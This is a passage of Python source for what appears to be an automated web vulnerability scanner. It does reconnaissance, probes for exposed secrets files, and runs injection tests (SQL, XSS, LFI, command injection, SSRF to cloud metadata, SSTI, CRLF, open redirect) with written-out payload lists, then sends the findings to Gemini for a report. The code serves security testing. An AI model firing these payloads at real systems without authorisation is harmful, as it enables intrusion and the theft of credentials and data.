                extracted = Utils.extract_tech_stack(dict(resp.headers), resp.text or "")
                techs.update(extracted)
                body = resp.text or ""
                if "webpack" in body.lower():
                    techs.add("Webpack")
                if "gtm.start" in body:
                    techs.add("Google Tag Manager")
                if "recaptcha" in body.lower():
                    techs.add("reCAPTCHA")
        except Exception:
            pass
        return sorted(techs)

    def _certificate_analysis(self) -> Dict:
        info = {}
        if not Config.CERTIFICATE_ANALYSIS:
            return info
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.domain, 443), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    if cert and CRYPTO_AVAILABLE:
                        parsed = x509.load_der_x509_certificate(cert, default_backend())
                        info["issuer"] = str(parsed.issuer.rfc4514_string())
                        info["subject"] = str(parsed.subject.rfc4514_string())
                        info["serial"] = str(parsed.serial_number)
                        info["not_before"] = str(parsed.not_valid_before_utc)
                        info["not_after"] = str(parsed.not_valid_after_utc)
                        info["expired"] = parsed.not_valid_after_utc < datetime.now(timezone.utc)
                        try:
                            san = parsed.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                            info["san"] = [str(n) for n in san.value]
                        except Exception:
                            info["san"] = []
        except Exception:
            pass
        return info

    def _pastebin_search(self) -> List[Dict]:
        findings = []
        try:
            resp = Utils.get(f"https://psbdmp.ws/api/v3/search?q={self.domain}", timeout=10)
            if resp and resp.status_code == 200:
                for item in resp.json().get("data", [])[:20]:
                    findings.append({
                        "id": item.get("id", ""),
                        "title": item.get("title", ""),
                        "url": f"https://pastebin.com/{item.get('id', '')}"
                    })
        except Exception:
            pass
        return findings

    def _social_media_discovery(self) -> List[Dict]:
        profiles = []
        name = self.domain.split('.')[0]
        platforms = [
            ("LinkedIn",  f"https://www.linkedin.com/company/{name}"),
            ("GitHub",    f"https://github.com/{name}"),
            ("Twitter/X", f"https://x.com/{name}"),
        ]
        for platform, url in platforms:
            try:
                resp = Utils.head(url, timeout=5)
                if resp and resp.status_code == 200:
                    profiles.append({"platform": platform, "url": url, "found": True})
            except Exception:
                continue
        return profiles

    def _dark_web_monitoring(self) -> List[Dict]:
        findings = []
        try:
            resp = Utils.get(f"https://haveibeenpwned.com/domain/{self.domain}", timeout=10)
            if resp:
                findings.append({
                    "source": "haveibeenpwned",
                    "domain": self.domain,
                    "note": "Check manually for breach data"
                })
        except Exception:
            pass
        return findings


# ═══════════════════════════════════════════════════════════════════════
# STAGE 3: WEB AUDIT ENGINE
# ═══════════════════════════════════════════════════════════════════════

class WebAuditEngine:
    """Comprehensive web application security audit."""

    # ─── Payloads / path lists ────────────────────────────────────────

    SENSITIVE_PATHS: ClassVar[List[str]] = [
        "/.env", "/.env.prod", "/.env.production", "/.env.dev", "/.env.local",
        "/.env.staging", "/.env.test", "/.env.example", "/.env.sample",
        "/.git/config", "/.git/HEAD", "/.gitignore", "/.gitattributes",
        "/.svn/entries", "/.DS_Store",
        "/sitemap.xml", "/robots.txt", "/security.txt", "/humans.txt",
        "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/",
        "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php~",
        "/xmlrpc.php", "/wp-content/debug.log",
        "/administrator/", "/admin/", "/login", "/backup/", "/backups/",
        "/config/", "/config.php", "/config.json", "/config.yaml",
        "/configuration.php", "/db.json", "/database.json",
        "/phpmyadmin/", "/pma/", "/adminer.php",
        "/api/", "/swagger.json", "/swagger.yaml", "/openapi.json",
        "/graphql", "/graphiql", "/playground",
        "/.well-known/security.txt", "/.well-known/openid-configuration",
        "/server-status", "/server-info",
        "/phpinfo.php", "/info.php", "/test.php",
        "/actuator", "/actuator/health", "/actuator/info",
        "/actuator/env", "/actuator/beans", "/actuator/metrics",
        "/actuator/loggers", "/actuator/httptrace", "/actuator/heapdump",
        "/actuator/threaddump", "/actuator/conditions",
        "/health", "/healthz", "/readyz", "/metrics", "/prometheus",
        "/console/", "/management/", "/monitor/",
        "/composer.json", "/composer.lock", "/package.json", "/package-lock.json",
        "/requirements.txt", "/Pipfile", "/Gemfile",
        "/Dockerfile", "/docker-compose.yml",
        "/nginx.conf", "/web.config", "/.htaccess", "/.htpasswd",
        "/error/", "/log/", "/logs/",
        "/upload/", "/uploads/", "/download/", "/downloads/",
        "/files/", "/docs/", "/documentation/",
        "/credentials.json", "/service-account.json", "/key.json",
        "/secret.json", "/secrets.json", "/settings.json",
        "/id_rsa", "/id_dsa", "/.ssh/id_rsa",
        "/.aws/credentials", "/.aws/config",
        "/application.properties", "/application.yml",
        "/terraform.tfstate",
    ]

    SSTI_PAYLOADS: ClassVar[List[str]] = [
        "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "*{7*7}",
        "{{7*'7'}}", "${7*'7'}",
        "{{config}}", "{{request}}", "{{self}}",
        "${jndi:ldap://127.0.0.1:1389/x}",
    ]

    SSRF_PARAMETERS: ClassVar[List[str]] = [
        "url", "uri", "path", "dest", "destination", "redirect", "return",
        "return_to", "next", "next_url", "redirect_uri", "callback",
        "image", "img", "src", "source", "load", "read", "file",
        "document", "page", "show", "view", "display", "download", "fetch",
        "host", "server", "addr", "target", "domain", "site", "endpoint",
    ]

    CORS_ORIGINS: ClassVar[List[str]] = [
        "https://evil.com", "null", "http://evil.com",
        "https://evil.com.evil.com", "https://evil.com:9999",
        "file:///etc/passwd",
    ]

    OPEN_REDIRECT_PAYLOADS: ClassVar[List[str]] = [
        "//evil.com", "https://evil.com", "http://evil.com",
        "///evil.com", r"\/\/evil.com", "/\\evil.com",
        "javascript:alert(1)", "%2f%2fevil.com", "//evil.com:80",
        "http://127.0.0.1", "http://localhost",
    ]

    CACHE_POISONING_HEADERS: ClassVar[List[str]] = [
        "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto",
        "X-Forwarded-For", "X-Host", "X-Original-URL", "X-Rewrite-URL",
    ]

    # ─── Init ─────────────────────────────────────────────────────────

    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.base_url = self.target.rstrip('/')
        self.findings: List[Dict[str, Any]] = []
        self.screenshots: List[str] = []
        # FIX: add logger so self.logger references don't crash
        self.logger = logging.getLogger(self.__class__.__name__)

    # ─── Main entry point called by ScanOrchestrator ──────────────────

    def run_all_checks(self, url: str) -> List[Dict[str, Any]]:
        """Execute all vulnerability checks against the target URL."""
        self.findings = []
        self.base_url = url.rstrip('/')
        self.logger.info(f"Starting full web audit for {url}")

        check_methods = [
            ("Sensitive Paths",      self._scan_sensitive_paths),
            ("SQL Injection",        lambda: self._check_sql_injection(url)),
            ("XSS",                  lambda: self._check_xss(url)),
            ("LFI/RFI",              lambda: self._check_lfi_rfi(url)),
            ("Command Injection",    lambda: self._check_command_injection(url)),
            ("CSRF",                 lambda: self._check_csrf(url)),
            ("SSRF",                 lambda: self._check_ssrf(url)),
            ("SSTI",                 lambda: self._check_ssti(url)),
            ("Open Redirect",        lambda: self._check_open_redirect(url)),
            ("CORS Misconfiguration",lambda: self._check_cors_misconfiguration(url)),
            ("CRLF Injection",       lambda: self._check_crlf(url)),
            ("Cache Poisoning",      lambda: self._check_cache_poisoning(url)),
            ("API Testing",          lambda: self._check_api_endpoints(url)),
            ("GraphQL Testing",      lambda: self._check_graphql(url)),
            ("IDOR",                 lambda: self._check_idor(url)),
            ("NoSQL Injection",      lambda: self._check_nosql_injection(url)),
            ("WordPress Enumeration",lambda: self._check_wordpress(url)),
        ]

        for check_name, check_func in check_methods:
            try:
                self.logger.info(f"  Running {check_name}...")
                results = check_func()
                if results:
                    self.logger.info(f"  {check_name}: {len(results)} issue(s)")
            except Exception as e:
                self.logger.error(f"  Error in {check_name}: {str(e)[:80]}")

        self.logger.info(f"Web audit complete: {len(self.findings)} findings")
        return self.findings

    # ─── Sensitive Path Scan ──────────────────────────────────────────

    def _scan_sensitive_paths(self) -> List[Dict[str, Any]]:
        """Scan for sensitive files and directories."""
        # FIX: was calling Utils.get(self.session, url) — wrong arg order
        def check_path(path: str) -> Optional[Dict]:
            try:
                url = urljoin(self.base_url + "/", path.lstrip("/"))
                resp = Utils.get(url, session=self.session, timeout=Config.TIMEOUT)
                if resp and resp.status_code not in [404, 403, 400, 410, 451]:
                    return {
                        "path": path,
                        "url": url,
                        "status": resp.status_code,
                        "content_type": resp.headers.get("Content-Type", ""),
                        "content_length": len(resp.content) if resp.content else 0,
                    }
            except Exception:
                pass
            return None

        discovered = []
        with ThreadPoolExecutor(max_workers=min(Config.THREADS, 15)) as executor:
            futures = {executor.submit(check_path, p): p for p in self.SENSITIVE_PATHS}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    discovered.append(res)

        # FIX: discovered contains dicts, not tuples — iterate correctly
        for item in discovered[:50]:
            path   = item["path"]
            status = item["status"]
            if Utils.is_false_positive(path):
                continue
            finding = {
                "type": "sensitive_path",
                "path": path,
                "url": item["url"],
                "status": status,
                "severity": "medium" if status == 200 else "low",
                "description": f"Exposed sensitive path: {path} (HTTP {status})"
            }
            self.findings.append(finding)

        return [f for f in self.findings if f.get("type") == "sensitive_path"]

    # ─── SQL Injection ────────────────────────────────────────────────

    def _check_sql_injection(self, url: str) -> List[Dict[str, Any]]:
        """FIX: was a nested function inside _scan_sensitive_paths — now a proper method."""
        sqli_payloads = [
            "'", "''", "' OR '1'='1", "' OR 1=1--",
            "\" OR \"1\"=\"1", "\" OR 1=1--",
            "1' ORDER BY 1--", "1' ORDER BY 2--",
            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
            "'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
            "admin'--", "admin' #",
        ]
        error_indicators = [
            "sql", "mysql", "syntax error", "unclosed quotation",
            "odbc", "driver", "sqlite", "postgresql",
            "you have an error", "warning: mysql", "division by zero",
            "unknown column", "from information_schema", "pg_sleep",
            "waitfor delay", "convert(int", "@@version"
        ]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload in sqli_payloads[:10]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        start = time.time()
                        resp = self.session.get(test_url, timeout=15, verify=False)
                        elapsed = time.time() - start
                        body_lower = resp.text.lower()
                        time_based = ("sleep" in payload.lower() or "waitfor" in payload.lower()) and elapsed > 4.5
                        error_based = any(ind in body_lower for ind in error_indicators)
                        if time_based or error_based:
                            finding = {
                                "type": "sql_injection",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "detection": "time_based" if time_based else "error_based",
                                "severity": "critical",
                                "description": f"SQL Injection in parameter '{param}'"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── XSS ──────────────────────────────────────────────────────────

    def _check_xss(self, url: str) -> List[Dict[str, Any]]:
        """FIX: was a nested function — now a proper class method."""
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<BODY ONLOAD=alert(1)>",
        ]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload in xss_payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if payload in resp.text:
                            sanitized = "&lt;" in resp.text or "&#x3C;" in resp.text
                            if not sanitized:
                                finding = {
                                    "type": "reflected_xss",
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "critical",
                                    "description": f"Reflected XSS in parameter '{param}'"
                                }
                                results.append(finding)
                                self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── LFI / RFI ────────────────────────────────────────────────────

    def _check_lfi_rfi(self, url: str) -> List[Dict[str, Any]]:
        lfi_payloads = [
            "/etc/passwd", "/etc/hosts", "/proc/self/environ",
            "/proc/version", "/etc/apache2/apache2.conf",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "C:\\Windows\\win.ini",
        ]
        lfi_indicators = [
            "root:", "daemon:", "bin:", "www-data", "uid=",
            "Microsoft Windows", "for 16-bit app support", "php://",
        ]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload in lfi_payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if any(ind in resp.text.lower() for ind in lfi_indicators):
                            finding = {
                                "type": "lfi",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "critical",
                                "description": f"Local File Inclusion in parameter '{param}'"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── Command Injection ────────────────────────────────────────────

    def _check_command_injection(self, url: str) -> List[Dict[str, Any]]:
        cmdi_tests = [
            ("; id",      "uid=",          "semicolon"),
            ("| id",      "uid=",          "pipe"),
            ("$(id)",     "uid=",          "subshell"),
            ("; sleep 5", "",              "sleep_unix"),
        ]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload, indicator, technique in cmdi_tests:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        start = time.time()
                        resp = self.session.get(test_url, timeout=15, verify=False)
                        elapsed = time.time() - start
                        time_based   = "sleep" in payload and elapsed > 4.5
                        output_based = bool(indicator) and indicator in resp.text.lower()
                        if time_based or output_based:
                            finding = {
                                "type": "command_injection",
                                "url": test_url,
                                "parameter": param,
                                "technique": technique,
                                "payload": payload,
                                "severity": "critical",
                                "description": f"Command Injection ({technique}) in parameter '{param}'"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── CSRF ─────────────────────────────────────────────────────────

    def _check_csrf(self, url: str) -> List[Dict[str, Any]]:
        results = []
        if not BS4_AVAILABLE:
            return results
        try:
            resp = self.session.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                form_action = urljoin(url, form.get('action', url))
                form_method = form.get('method', 'get').upper()
                inputs = form.find_all('input')
                has_csrf = any(
                    any(tok in inp.get('name', '').lower()
                        for tok in ['csrf', 'token', '_token', 'authenticity_token', 'xsrf', 'nonce'])
                    and inp.get('type', '') == 'hidden' and inp.get('value', '')
                    for inp in inputs
                )
                if not has_csrf and form_method == 'POST':
                    finding = {
                        "type": "csrf",
                        "url": form_action,
                        "method": form_method,
                        "severity": "high",
                        "description": f"CSRF: no token in POST form at {form_action}"
                    }
                    results.append(finding)
                    self.findings.append(finding)
        except Exception:
            pass
        return results

    # ─── SSRF ─────────────────────────────────────────────────────────

    def _check_ssrf(self, url: str) -> List[Dict[str, Any]]:
        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "http://localhost:22/",
            "http://127.0.0.1:8080/",
        ]
        ssrf_indicators = [
            "meta-data", "user-data", "ami-id", "instance-id",
            "root:", "daemon:", "ssh-rsa",
        ]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload in ssrf_targets:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if any(ind in resp.text.lower() for ind in ssrf_indicators):
                            finding = {
                                "type": "ssrf",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "critical",
                                "description": f"SSRF in parameter '{param}'"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── SSTI ─────────────────────────────────────────────────────────

    def _check_ssti(self, url: str) -> List[Dict[str, Any]]:
        ssti_tests = [
            ("jinja2",    "{{7*7}}",    "49"),
            ("jinja2",    "{{7*'7'}}",  "7777777"),
            ("freemarker","${7*7}",     "49"),
            ("erb",       "<%= 7*7 %>", "49"),
        ]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for engine, payload, expected in ssti_tests:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if expected and expected in resp.text:
                            finding = {
                                "type": "ssti",
                                "engine": engine,
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "critical",
                                "description": f"SSTI ({engine}) in parameter '{param}'"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── Open Redirect ────────────────────────────────────────────────

    def _check_open_redirect(self, url: str) -> List[Dict[str, Any]]:
        redirect_payloads = [
            "//evil.com", "https://evil.com", "http://evil.com",
            "///evil.com", "javascript:alert(1)",
        ]
        redirect_params = [
            "url", "return", "next", "redirect", "redir", "redirect_uri",
            "continue", "return_to", "dest", "destination", "goto", "out",
        ]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload in redirect_payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, allow_redirects=False, verify=False)
                        location = resp.headers.get('Location', '')
                        if location and any(evil in location.lower() for evil in ['evil.com', 'javascript:']):
                            finding = {
                                "type": "open_redirect",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "redirect_to": location,
                                "severity": "medium",
                                "description": f"Open Redirect in parameter '{param}' to {location}"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── CORS ─────────────────────────────────────────────────────────

    def _check_cors_misconfiguration(self, url: str) -> List[Dict[str, Any]]:
        test_origins = [
            "https://evil.com", "null", "http://evil.com",
            "http://127.0.0.1", "https://evil.com.evil.com",
        ]
        results = []
        try:
            for origin in test_origins:
                resp = self.session.get(url, headers={"Origin": origin}, timeout=10, verify=False)
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                if acao in ('*', origin, 'null') and acao:
                    severity = "high" if acac == 'true' else "medium"
                    finding = {
                        "type": "cors_misconfiguration",
                        "url": url,
                        "origin": origin,
                        "acao": acao,
                        "credentials": acac == 'true',
                        "severity": severity,
                        "description": f"CORS allows origin '{origin}' (credentials: {acac})"
                    }
                    results.append(finding)
                    self.findings.append(finding)
        except Exception:
            pass
        return results

    # ─── CRLF ─────────────────────────────────────────────────────────

    def _check_crlf(self, url: str) -> List[Dict[str, Any]]:
        # FIX: `parsed` and `base_url` were used but never defined in original nested function
        crlf_payloads = [
            "%0d%0aSet-Cookie:%20test=crlf",
            "%0aSet-Cookie:%20test=crlf",
            "%0d%0aX-Custom:%20injected",
        ]
        results = []
        parsed = urlparse(url)                                       # FIX: define parsed
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"    # FIX: define base

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload in crlf_payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, allow_redirects=False, verify=False)
                        if 'test=crlf' in resp.headers.get('Set-Cookie', ''):
                            finding = {
                                "type": "crlf_injection",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "high",
                                "description": f"CRLF Injection in parameter '{param}'"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── Cache Poisoning ──────────────────────────────────────────────

    def _check_cache_poisoning(self, url: str) -> List[Dict[str, Any]]:
        poison_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Forwarded-Scheme", "http"),
            ("X-Original-URL", "/admin"),
            ("X-Forwarded-For", "127.0.0.1"),
        ]
        results = []
        try:
            for header, value in poison_headers:
                resp = self.session.get(url, headers={header: value}, timeout=10, verify=False)
                if value in resp.text or value in str(resp.headers):
                    finding = {
                        "type": "cache_poisoning",
                        "url": url,
                        "header": header,
                        "value": value,
                        "severity": "high",
                        "description": f"Cache poisoning via header '{header}: {value}'"
                    }
                    results.append(finding)
                    self.findings.append(finding)
        except Exception:
            pass
        return results

    # ─── API Endpoints ────────────────────────────────────────────────

    def _check_api_endpoints(self, url: str) -> List[Dict[str, Any]]:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/actuator", "/actuator/health",
            "/v1/graphql", "/graphql",
        ]
        results = []
        for path in api_paths:
            test_url = f"{base}{path}"
            try:
                resp = self.session.get(test_url, timeout=10, verify=False)
                if resp.status_code in [200, 201, 202]:
                    finding = {
                        "type": "api_discovery",
                        "url": test_url,
                        "status": resp.status_code,
                        "severity": "info",
                        "description": f"API endpoint discovered: {test_url}"
                    }
                    results.append(finding)
                    self.findings.append(finding)
            except Exception:
                pass
        return results

    # ─── GraphQL ──────────────────────────────────────────────────────

    def _check_graphql(self, url: str) -> List[Dict[str, Any]]:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        graphql_paths = ["/graphql", "/graphiql", "/v1/graphql", "/gql"]
        results = []
        introspection = {"query": "query { __schema { types { name } } }"}
        for path in graphql_paths:
            test_url = f"{base}{path}"
            try:
                resp = self.session.post(test_url, json=introspection, timeout=10, verify=False)
                if resp.status_code == 200 and '__schema' in resp.text:
                    finding = {
                        "type": "graphql_introspection",
                        "url": test_url,
                        "severity": "high",
                        "description": f"GraphQL introspection enabled at {test_url}"
                    }
                    results.append(finding)
                    self.findings.append(finding)
            except Exception:
                pass
        return results

    # ─── IDOR ─────────────────────────────────────────────────────────

    def _check_idor(self, url: str) -> List[Dict[str, Any]]:
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                if any(k in param.lower() for k in ["id", "uid", "pid", "account", "order", "invoice"]):
                    for test_id in [1, 2, 100, 9999]:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param] = str(test_id)
                        test_url = f"{base}?{urlencode(test_params)}"
                        try:
                            resp = self.session.get(test_url, timeout=10, verify=False)
                            if resp.status_code == 200 and len(resp.text) > 100:
                                finding = {
                                    "type": "idor",
                                    "url": test_url,
                                    "parameter": param,
                                    "tested_id": test_id,
                                    "severity": "high",
                                    "description": f"Possible IDOR in parameter '{param}' (ID: {test_id})"
                                }
                                results.append(finding)
                                self.findings.append(finding)
                                break
                        except Exception:
                            pass
        return results

    # ─── NoSQL Injection ──────────────────────────────────────────────

    def _check_nosql_injection(self, url: str) -> List[Dict[str, Any]]:
        nosql_payloads = [
            '{"$gt": ""}', '{"$ne": ""}', "admin' || '1'=='1",
            '{"$where": "1==1"}',
        ]
        indicators = ["mongodb", "mongo", "$where", "bson", "unauthorized"]
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if parsed.query:
            params = dict(parse_qs(parsed.query))
            for param in params:
                for payload in nosql_payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f"{base}?{urlencode(test_params)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if any(ind in resp.text.lower() for ind in indicators):
                            finding = {
                                "type": "nosql_injection",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "critical",
                                "description": f"NoSQL Injection in parameter '{param}'"
                            }
                            results.append(finding)
                            self.findings.append(finding)
                    except Exception:
                        pass
        return results

    # ─── WordPress ────────────────────────────────────────────────────

    def _check_wordpress(self, url: str) -> List[Dict[str, Any]]:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        wp_checks = {
            "/wp-admin/":                ("WordPress admin panel",    "medium"),
            "/xmlrpc.php":               ("WordPress XML-RPC",        "medium"),
            "/wp-config.php.bak":        ("WordPress config backup",  "critical"),
            "/wp-json/wp/v2/users/":     ("WordPress user enum",      "medium"),
            "/wp-content/debug.log":     ("WordPress debug log",      "critical"),
            "/readme.html":              ("WordPress version disclose","low"),
        }
        results = []
        for path, (description, severity) in wp_checks.items():
            test_url = f"{base}{path}"
            try:
                resp = self.session.get(test_url, timeout=10, allow_redirects=False, verify=False)
                if resp.status_code == 200:
                    finding = {
                        "type": "wordpress_enum",
                        "url": test_url,
                        "status": resp.status_code,
                        "severity": severity,
                        "description": f"WordPress: {description}"
                    }
                    results.append(finding)
                    self.findings.append(finding)
            except Exception:
                pass
        return results


# ═══════════════════════════════════════════════════════════════════════
# AI VULNERABILITY ANALYZER
# ═══════════════════════════════════════════════════════════════════════

class AIVulnerabilityAnalyzer:
    def __init__(self, api_keys: List[str]):
        # FIX: accepts list; falls back gracefully if empty
        self.api_keys = api_keys if api_keys else [Config.GEMINI_API_KEY]
        self.current_key_index = 0
        self.base_url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"

    def _get_next_key(self) -> str:
        key = self.api_keys[self.current_key_index % len(self.api_keys)]
        self.current_key_index = (self.current_key_index + 1) % len(self.api_keys)
        return key

    def analyze_findings(self, findings: List[Dict], target: str) -> Optional[Dict]:
        if not findings or not self.api_keys:
            return None
        findings_summary = [
            {
                "type": f.get("type", "unknown"),
                "severity": f.get("severity", "info"),
                "url": f.get("url", ""),
                "parameter": f.get("parameter", ""),
                "payload": (f.get("payload", "") or "")[:50],
                "description": f.get("description", ""),
            }
            for f in findings
        ]
        prompt = (
            f"You are a senior penetration testing AI. Analyze these security findings for {target}.\n\n"
            f"Findings ({len(findings_summary)} total):\n{json.dumps(findings_summary, indent=2)}\n\n"
            "Return ONLY valid JSON with keys: critical_findings, high_findings, medium_findings, "
            "low_findings, attack_chains, remediation, false_positives"
        )
        try:
            key = self._get_next_key()
            response = requests.post(
                f"{self.base_url}?key={key}",
                json={
                    "contents": [{"parts": [{"text": prompt}]}],
                    "generationConfig": {"temperature": 0.1, "maxOutputTokens": 4096}
                },
                timeout=30
            )
            if response.status_code == 200:
                text = (
                    response.json()
                    .get('candidates', [{}])[0]
                    .get('content', {})
                    .get('parts', [{}])[0]
                    .get('text', '')
                )
                json_match = re.search(r'```json\n(.*?)\n```', text, re.DOTALL)
                if json_match:
                    return json.loads(json_match.group(1))
                try:
                    return json.loads(text)
                except Exception:
                    return {"raw_analysis": text}
        except Exception as e:
            logging.error(f"AI analysis error: {e}")
        return None


# ═══════════════════════════════════════════════════════════════════════
# REPORT GENERATOR
# ═══════════════════════════════════════════════════════════════════════

class ReportGenerator:
    def __init__(self, target: str, findings: List[Dict], ai_analysis: Optional[Dict] = None):
        self.target = target
        self.findings = findings
        self.ai_analysis = ai_analysis
        self.timestamp = datetime.utcnow().isoformat()

    def _categorize_findings(self) -> Tuple[Dict, Dict]:
        categorized: Dict[str, List] = {
            "critical": [], "high": [], "medium": [], "low": [], "info": []
        }
        by_type: Dict[str, List] = {}
        for f in self.findings:
            sev   = f.get("severity", "info")
            ftype = f.get("type", "unknown")
            if sev in categorized:
                categorized[sev].append(f)
            by_type.setdefault(ftype, []).append(f)
        return categorized, by_type

    def generate_markdown_report(self) -> str:
        categorized, by_type = self._categorize_findings()
        lines = [
            f"# Vulnerability Assessment Report",
            f"",
            f"**Target:** `{self.target}`",
            f"**Scan Date:** `{self.timestamp}`",
            f"**Total Findings:** `{len(self.findings)}`",
            f"",
            f"## Severity Summary",
            f"",
            f"| Severity | Count |",
            f"|----------|-------|",
        ]
        for sev in ["critical", "high", "medium", "low", "info"]:
            count = len(categorized[sev])
            if count > 0:
                lines.append(f"| **{sev.upper()}** | {count} |")
        lines.append("")

        if self.ai_analysis:
            lines.append("## AI-Powered Analysis\n")
            for key, label in [
                ("critical_findings", "Critical Findings"),
                ("high_findings",     "High Findings"),
                ("attack_chains",     "Potential Attack Chains"),
                ("remediation",       "Recommended Remediation"),
            ]:
                items = self.ai_analysis.get(key, [])
                if items:
                    lines.append(f"### {label}\n")
                    for item in items:
                        if isinstance(item, dict):
                            lines.append(f"- **{item.get('title', item.get('type', 'Unknown'))}** — {item.get('description', '')}")
                        else:
                            lines.append(f"- {item}")
                    lines.append("")

        lines.append("## Detailed Findings\n")
        for ftype, flist in sorted(by_type.items()):
            title = ftype.replace("_", " ").title()
